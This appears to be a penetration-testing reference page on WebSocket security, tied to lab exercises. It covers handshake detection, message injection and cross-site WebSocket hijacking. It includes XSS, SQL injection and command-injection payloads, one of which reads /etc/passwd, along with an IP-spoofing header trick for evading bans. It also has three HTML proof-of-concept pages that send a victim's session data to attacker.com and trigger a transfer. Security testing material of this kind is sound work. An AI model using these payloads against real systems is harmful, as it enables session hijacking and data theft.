---
id: PS-WS
category: WebSockets
wstg_refs: [WSTG-CLNT-10]
lab_count: 3
---

# WebSocket Security: Attack Technique Reference

## 1. Detection

### 1A. Identifying WebSocket Connections

WebSocket connections start as an HTTP Upgrade request, then switch to a persistent bidirectional channel.

**Handshake request (client to server):**

```
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
Cookie: session=abc123
```

**Handshake response (server to client):**

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Detection methods:**

```bash
# Check for WebSocket endpoints by looking for upgrade responses
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  https://target.com/chat

# Look for 101 Switching Protocols response
```

**Browser DevTools detection:**
1. Open DevTools (F12) > Network tab
2. Filter by "WS" to show only WebSocket connections
3. Browse the application — WebSocket connections appear as they are established
4. Click a connection to see individual messages in the Messages tab

**JavaScript source search:**

```javascript
// Search for WebSocket usage in application JavaScript
/new\s+WebSocket\s*\(/g
/\.onmessage\s*=/g
/\.send\s*\(/g
```

### 1B. Protocol Variants

| Protocol | Description | Security |
|----------|-------------|----------|
| `ws://` | Unencrypted WebSocket | Vulnerable to MitM — plaintext messages |
| `wss://` | TLS-encrypted WebSocket | Encrypted channel — still vulnerable to logic flaws |

**Key:** `wss://` protects against eavesdropping but does NOT protect against application-layer attacks (XSS via messages, CSWSH, etc.).

## 2. Techniques

### 2A. WebSocket Message Manipulation

WebSocket messages are typically JSON objects sent between client and server. If the server processes message content without sanitization, standard injection payloads work.

**Common vulnerable pattern:**

```javascript
// Server receives message and renders it to other users
// Client sends:
{"message": "Hello world"}

// Server broadcasts to all connected clients without sanitization
// Other clients render: element.innerHTML = receivedMessage;
```

**XSS via WebSocket messages:**

```json
{"message": "<img src=1 onerror='alert(1)'>"}
```

```json
{"message": "<script>alert(document.cookie)</script>"}
```

```json
{"message": "<svg/onload=alert(1)>"}
```

**SQL injection via WebSocket messages (if server queries DB):**

```json
{"message": "test' OR 1=1--"}
{"user_id": "1 UNION SELECT username,password FROM users--"}
```

**Command injection via WebSocket messages:**

```json
{"filename": "test; cat /etc/passwd"}
{"command": "status|id"}
```

**Testing methodology:**

1. Establish WebSocket connection (via browser or `websocat`)
2. Send a normal message to understand the expected format
3. Inject XSS payloads in each message field
4. Inject SQLi/CMDi payloads if the server processes data server-side
5. Check if injected content is reflected to other connected clients (stored XSS)

> Lab refs: PS-WS-01

### 2B. WebSocket Handshake Manipulation

The WebSocket handshake is an HTTP request that can be modified to bypass access controls or evade security filters.

**Manipulable handshake components:**

| Component | Manipulation | Purpose |
|-----------|-------------|---------|
| `Cookie` header | Swap session tokens | Test authorization across user roles |
| `Origin` header | Change to arbitrary origin | Test origin validation |
| `X-Forwarded-For` header | Spoof IP address | Bypass IP-based restrictions or bans |
| `X-Real-IP` header | Spoof IP address | Same as above |
| URL parameters | Add/modify query params | Bypass filters or inject data |

**Bypass IP-based restrictions (e.g., after being banned for XSS attempts):**

If the server blocks your IP after detecting XSS payloads, add an IP spoofing header to the handshake:

```
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
X-Forwarded-For: 127.0.0.1
Cookie: session=abc123
```

Then retry the XSS payload in WebSocket messages. The server may only filter based on the initial connection IP.

**Testing with websocat:**

```bash
# Connect with custom headers
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Cookie: session=abc123" \
  wss://target.com/chat

# Then type messages to send
{"message": "<img src=x onerror=alert(1)>"}
```

> Lab refs: PS-WS-03

### 2C. Cross-Site WebSocket Hijacking (CSWSH)

CSWSH exploits the fact that WebSocket handshakes are regular HTTP requests, making them susceptible to CSRF if no origin validation or CSRF tokens are used. Unlike standard CSRF, WebSocket hijacking provides **bidirectional communication** — the attacker can both send messages and read responses.

**Vulnerability conditions:**

1. WebSocket handshake relies solely on HTTP cookies for authentication (no CSRF token in handshake)
2. Server does NOT validate the `Origin` header during handshake
3. No other anti-CSRF mechanism (custom headers, nonce in URL)

**Checking for vulnerability:**

```bash
# Inspect the handshake — look for session cookie dependency
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: https://evil-attacker.com" \
  -H "Cookie: session=VICTIM_SESSION" \
  https://target.com/chat

# If 101 Switching Protocols: server accepts cross-origin handshake = VULNERABLE
# If 403 or no upgrade: server validates origin = NOT vulnerable
```

**Key:** The `Sec-WebSocket-Key` header is for proxy caching prevention only — it provides NO authentication or CSRF protection.

**Exploitation PoC (data exfiltration):**

```html
<html>
<body>
<script>
// Connect to victim's WebSocket using their cookies
var ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
    // Send a message that triggers the server to return sensitive data
    ws.send('READY');
};

ws.onmessage = function(event) {
    // Exfiltrate every message received from the victim's session
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};
</script>
</body>
</html>
```

**Exploitation PoC (trigger actions as victim):**

```html
<script>
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() {
    // Send messages as the authenticated victim
    ws.send(JSON.stringify({
        "action": "transfer",
        "to": "attacker",
        "amount": 1000
    }));
};
</script>
```

**Exploitation PoC (chat history theft):**

```html
<script>
var ws = new WebSocket('wss://target.com/chat');
var exfilData = [];

ws.onopen = function() {
    // Request chat history
    ws.send('READY');
};

ws.onmessage = function(event) {
    exfilData.push(event.data);
    // Exfiltrate periodically
    if (exfilData.length % 10 === 0) {
        fetch('https://attacker.com/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(exfilData)
        });
    }
};

// Exfiltrate remaining data when connection closes
ws.onclose = function() {
    fetch('https://attacker.com/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(exfilData)
    });
};
</script>
```

> Lab refs: PS-WS-02

## 3. Testing Tools

### 3A. websocat (CLI WebSocket Client)

```bash
# Basic connection

# Connection with custom headers
  -H "Cookie: session=abc123" \
  -H "Origin: https://target.com" \
  wss://target.com/chat

# Connection with verbose output (shows handshake)

# Send a single message and read response

# Connection with IP spoofing header
  -H "X-Forwarded-For: 10.0.0.1" \
  wss://target.com/chat
```

### 3B. Browser DevTools

1. **Network tab:** Filter "WS" to find WebSocket connections
2. **Messages sub-tab:** View sent/received messages in real time
3. **Console:** Interact with WebSocket objects directly:

```javascript
// Find existing WebSocket connections
// (only works if the page stores the reference in an accessible variable)

// Create a new connection for testing
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = function(e) { console.log('Received:', e.data); };
ws.onopen = function() { ws.send('{"message":"test"}'); };
```

### 3C. Burp Suite

1. **Proxy > WebSockets history:** View all WebSocket messages
2. **Proxy > Intercept:** Toggle WebSocket interception to modify messages in transit
3. **Repeater:** Clone a WebSocket connection to replay and modify messages
4. **Intruder:** Not directly supported for WebSockets — use websocat scripts for fuzzing

## 4. Testing Checklist

### 4A. WebSocket Handshake Security

| Check | How to Test | Finding |
|-------|------------|---------|
| Authentication in handshake | Remove Cookie header, attempt connection | If 101: unauthenticated WebSocket access |
| Origin validation | Change Origin to `https://evil.com`, attempt connection | If 101: CSWSH possible |
| CSRF token in handshake | Check if handshake URL contains a nonce/token | If no token: CSWSH possible |
| Protocol security | Check `ws://` vs `wss://` | If `ws://`: messages visible to MitM |
| Session token in URL | Check if token is in WebSocket URL query string | If yes: token leaks in logs/referrer |

### 4B. WebSocket Message Security

| Check | How to Test | Finding |
|-------|------------|---------|
| XSS in messages | Send `<img src=x onerror=alert(1)>` as message | If alert fires on other clients: stored XSS |
| SQLi in messages | Send `' OR 1=1--` in data fields | If error or data leak: SQL injection |
| CMDi in messages | Send `; id` or `| id` in data fields | If command output returned: command injection |
| Input validation | Send oversized messages, special characters, null bytes | Application behavior changes |
| Rate limiting | Send rapid messages in loop | If no throttling: DoS possible |
| Authorization | Send admin-only commands with user session | If accepted: privilege escalation |

### 4C. CSWSH Assessment

| Step | Action | Expected Result |
|------|--------|----------------|
| 1 | Inspect handshake request | Identify auth mechanism (cookies, tokens, headers) |
| 2 | Check if handshake has CSRF token | If no token: proceed to step 3 |
| 3 | Test cross-origin handshake (change Origin header) | If 101 accepted: confirmed vulnerable |
| 4 | Create attacker HTML page with WebSocket PoC | Host on attacker domain |
| 5 | Open attacker page while authenticated to target | WebSocket connects using victim's cookies |
| 6 | Send message via hijacked WebSocket | Verify server processes it as victim |
| 7 | Read responses from hijacked WebSocket | Verify sensitive data is accessible |
